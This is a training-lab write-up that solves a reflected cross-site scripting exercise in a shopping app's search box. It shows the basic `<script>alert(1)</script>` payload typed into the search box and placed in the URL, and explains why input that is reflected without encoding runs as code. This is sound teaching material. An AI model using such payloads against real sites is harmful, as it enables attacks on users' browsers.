# Reflected XSS into HTML context with nothing encoded — Apprentice

**Status:** Solved

---

## Goal

Inject JavaScript code that executes in the victims browser through a reflected XSS vulnerability.

---

## Steps (simple & complete)

1. **Find the injection point**
   - Go to the shopping app
   - Use the search functionality
   - Type something like "test" and hit enter

2. **Observe the reflection**
   - Your search term appears on the page
   - Check the HTML source:
```html
   <h1>Search results for: test</h1>
```
   - The input is reflected without encoding!

3. **Test for XSS**
   - Try a simple payload:
```
   <script>alert(1)</script>
```
   - Enter it in the search box

4. **Execute the attack**
```
   Search: <script>alert(1)</script>
```
   
   Or via URL:
```bash
   https://TARGET/?search=<script>alert(1)</script>
```

5. **Verify the alert**
   - If alert popup appears → XSS works!
   - Lab solves automatically

---

## Example

**Normal search:**
```
URL: /?search=laptop
Page shows: Search results for: laptop
```

**XSS payload:**
```
URL: /?search=<script>alert(1)</script>
Result: Alert popup appears! ✓
```

The browser executes your JavaScript!

---

## Why it works

**Vulnerable code:**
```html
<h1>Search results for: USER_INPUT_HERE</h1>
```

**After injection:**
```html
<h1>Search results for: <script>alert(1)</script></h1>
```

Browser sees `<script>` tag and executes it!

---

